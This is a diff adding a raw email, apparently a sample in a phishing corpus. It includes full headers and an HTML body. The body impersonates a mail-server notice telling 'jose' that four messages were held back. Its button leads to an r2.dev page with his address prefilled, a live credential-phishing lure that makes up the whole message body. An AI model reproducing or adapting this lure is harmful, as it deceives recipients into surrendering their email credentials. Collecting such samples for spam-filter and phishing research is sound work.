@@ -1,0 +1,146 @@
+From jose@monkey.org Mon Oct 23 13:09:17 2023 +0000
+Return-Path: info@sairtt.com
+Delivered-To: jose@monkey.org
+X-FDA: 81376757154.30.F07D548
+Received: from sairtt.com (sairtt.com [5.206.227.135])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 200E760007
+	for <jose@monkey.org>; Mon, 23 Oct 2023 13:09:15 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=pass header.d=sairtt.com header.s=dkim header.b=RbZRZWFB;
+	spf=pass (imf14.b.hostedemail.com: domain of info@sairtt.com designates 5.206.227.135 as permitted sender) smtp.mailfrom=info@sairtt.com;
+	dmarc=pass (policy=reject) header.from=sairtt.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1698066556;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=5NZ6TBx18+E0BZuqS3i/FmuJUrfVp8MVD8xsvqKFpP4=;
+	b=rV5Vsoki+7uXcerv6ndQnUamfyzUXsjWIot68s56KSWAO2KjkcHGgHbtmSkFL+YFaeo1XW
+	UqgzSX38B9ilc3bO5ecWlrU/YvewijHq1n1Y5yk35HN8JRZ/8OPGVh8jpPT/mCdlxD/g9w
+	kJsrpsw3LQj6PakwSVUF6un9uLVxNf4=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1698066556; a=rsa-sha256;
+	cv=none;
+	b=xXgnKlEV7XvsxusuEzeuaZRJCHdPexu638Qh4cmWpnIZKXku7mqvCOR6rva01M5a9vHb08
+	JG60xazEx5DxE3YIhqbaZyOAGQxOF3VY6Woo5h2vF5oU/XwKeDVACIVofAj5VbKMWStAMl
+	zT6gTDEIdXjNX4LQjVSVFDmsSSe3Oow=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=pass header.d=sairtt.com header.s=dkim header.b=RbZRZWFB;
+	spf=pass (imf14.b.hostedemail.com: domain of info@sairtt.com designates 5.206.227.135 as permitted sender) smtp.mailfrom=info@sairtt.com;
+	dmarc=pass (policy=reject) header.from=sairtt.com
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sairtt.com;
+	s=dkim; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date
+	:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=5NZ6TBx18+E0BZuqS3i/FmuJUrfVp8MVD8xsvqKFpP4=; b=RbZRZWFBqCNw0vVA69rJawLIDV
+	RRCQYWX5bzgFZ2nlTfxV/SFP+w2Cp4+wSe70R4gRzS4wCBt0QT8gZdEsCXqPYnhjOYxG2zZh+KM7F
+	+KPc4LAOob0nW2aJ0BHwDl96dQBg+zUjJsSyzt69O0fOifUNrfcuSNVSU0V9wUu/Kx2Q=;
+Received: from [95.214.27.225]
+	by sairtt.com with esmtpa (Exim 4.96.1)
+	(envelope-from <info@sairtt.com>)
+	id 1quugE-0001g5-1b
+	for jose@monkey.org;
+	Mon, 23 Oct 2023 13:09:14 +0000
+From: monkey.org Server  <info@sairtt.com>
+To: jose@monkey.org
+Subject: You Have [4] Unreceived Emails*** E-5130700
+Date: 23 Oct 2023 15:09:14 +0200
+Message-ID: <20231023150914.0585698DA4D6575F@sairtt.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 200E760007
+X-Stat-Signature: ra443fqfq71s7n4kwd18ennx1d8cpoyy
+X-Rspam-User: 
+X-Spam-Status: No, score=0.30
+X-HE-Tag: 1698066555-655357
+X-HE-Meta: U2FsdGVkX19/nUukVz8kxhKV+w4jkn5C0PSVpEyws1P+5zRQB571tUEBAQ+5lyDvTwEab7W7a/rUaH1rPVbkDnUPptM9OQJ6YBo5Da/9Vwc0btp+v7dkFStxphJ0dVPu15ZKep113CAHDF0tKiOHCWG0HmH73bscrD5V4lv7gCPA+FODBn5543bLBTgwo5AI01aegwjvHppsCkhzs+16rihzCYIaDRiXpypf/xtJXb2MmoXOGn7FyYDy7vO/WjkYO7XQ1fJY7SEJP4wvNVzcb7YTTgaGnSY4Wqd9skgxVBAhJzD1Ez2wlatGnYqLPB3nVEaWmoKpb0QosMRQ2Z8JwAo9BszstbHdzTDQIhPfYKUxCVz3G3SymBsLdr2oBd90
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 328
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
+; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
+troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
+: initial; text-decoration-color: initial;">
+<div style=3D"padding: 5px; width: 703px; color: black; line-height: normal=
+; font-size: 16px;"></div></div>
+<table style=3D"width: 546.66px; color: rgb(34, 34, 34); text-transform: no=
+ne; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font=
+-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
+nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: in=
+itial; text-decoration-style: initial;=20
+text-decoration-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0"><tbody><tr><td valign=3D"top" style=3D"margin: 0px; padding: 30px 20=
+px; text-align: center; color: rgb(138, 155, 168); line-height: 13px; font-=
+size: 11px;"><div class=3D"Ar Au Ao" id=3D":3pk" style=3D"display: block;">=
+<div class=3D"Ar Au Ao" id=3D":3p9" style=3D"display: block;">
+<div tabindex=3D"1" class=3D"Am Al editable LW-avf tS-tW tS-tY" id=3D":3ty"=
+ role=3D"textbox" aria-controls=3D":407" aria-owns=3D":407" style=3D"direct=
+ion: ltr; min-height: 358px;" contenteditable=3D"true" hidefocus=3D"true" s=
+pellcheck=3D"false" aria-label=3D"Message Body" aria-multiline=3D"true" g_e=
+ditable=3D"true"><br><table width=3D"520" align=3D"center" style=3D'width: =
+520px; font-family: "Segoe UI",Arial,Helvetica; font-size: 12px; border-col=
+lapse: collapse;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody>
+<tr style=3D"height: 90px;"><td height=3D"90" style=3D"height: 90px;"><tabl=
+e width=3D"100%" style=3D"height: 90px; border-collapse: collapse;" bgcolor=
+=3D"#0078d7" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr style=3D"height=
+: 90px;"><td width=3D"90" height=3D"90" style=3D"padding: 0px; width: 90px;=
+ height: 90px;"><div style=3D"margin: 0px; padding: 0px; width: 90px; heigh=
+t: 90px;"></div></td><td height=3D"90" style=3D"height: 90px;" bgcolor=3D"#=
+0078d7">
+<div style=3D'margin: 0px 30px; padding: 0px; color: rgb(255, 255, 255); fo=
+nt-family: "Segoe UI Light","Segoe WP Light","Segoe UI",Helvetica,Arial,ser=
+if,EmojiFont; font-size: 18px;'><div style=3D"margin: 0px 0px 0px 10px; pad=
+ding: 0px; font-size: 28px;"><span style=3D"vertical-align: inherit;">Notif=
+ication</span></div></div></td></tr></tbody></table></td></tr><tr><td>
+<div style=3D'margin: 0px 0px 0px 120px; padding: 0px; color: rgb(51, 51, 5=
+1); line-height: 20px; font-family: "Segoe UI","Segoe WP",Segoe,Tahoma,"Mic=
+rosoft Sans Serif",Verdana,sans-serif,serif,EmojiFont; direction: ltr;'><di=
+v style=3D"margin: 20px 120px 30px 0px; padding: 0px; line-height: 20px;">
+<span style=3D'border-width: 0px; margin: 0px; padding: 0px; line-height: n=
+ormal; font-family: "Calibri Light","Helvetica Light",sans-serif; font-size=
+: 12pt; vertical-align: baseline; font-stretch: inherit;'>Dear jose,</span>=
+</div><div align=3D"center" style=3D"margin: 0px 120px 30px 0px; padding: 0=
+px; color: rgb(102, 102, 102); line-height: 20px;">
+<span style=3D'border-width: 0px; margin: 0px; padding: 0px; line-height: n=
+ormal; font-family: "Calibri Light","Helvetica Light",sans-serif; font-size=
+: 12pt; vertical-align: baseline; font-stretch: inherit;'>You have&nbsp;4 U=
+nreceived Clustered Emails on&nbsp;10/23/2023 3:09:14 p.m.&nbsp; was not de=
+livered to Inbox.</span></div><div align=3D"center" style=3D"margin: 0px 12=
+0px 30px 0px; padding: 0px; color: rgb(102, 102, 102); line-height: 20px;">=
+
+<span style=3D'border-width: 0px; margin: 0px; padding: 0px; line-height: n=
+ormal; font-family: "Calibri Light","Helvetica Light",sans-serif; font-size=
+: 12pt; vertical-align: baseline; font-stretch: inherit;'>This was due to a=
+ system delay.</span><br><br><span style=3D'border-width: 0px; margin: 0px;=
+ padding: 0px; line-height: normal; font-family: "Calibri Light","Helvetica=
+ Light",sans-serif; font-size: 12pt; vertical-align: baseline; font-stretch=
+: inherit;'>Rectify Below:<br><br></span>
+<a style=3D'border-width: 0px; margin: 0px; padding: 12px 18px; border-radi=
+us: 5px; color: rgb(255, 255, 255); line-height: 16px; font-family: "Google=
+ Sans",Roboto,RobotoDraft,Helvetica,Arial,sans-serif; vertical-align: basel=
+ine; display: inline-block; min-width: 90px; font-stretch: inherit; backgro=
+und-color: rgb(65, 132, 243);' rel=3D"noopener noreferrer">
+<span style=3D'border-width: 0px; margin: 0px; padding: 0px; line-height: n=
+ormal; font-family: "Calibri Light","Helvetica Light",sans-serif; font-size=
+: 12pt; vertical-align: baseline; font-stretch: inherit;'></span><a href=3D=
+"https://pub-a377fb7f93c74ed4bff222d63425e23e.r2.dev/index.html#jose@monkey=
+=2Eorg">Release Pending Message To Inbox</a></div></div></td></tr></tbody><=
+/table></div></div></div></td></tr></tbody></table></body></html>
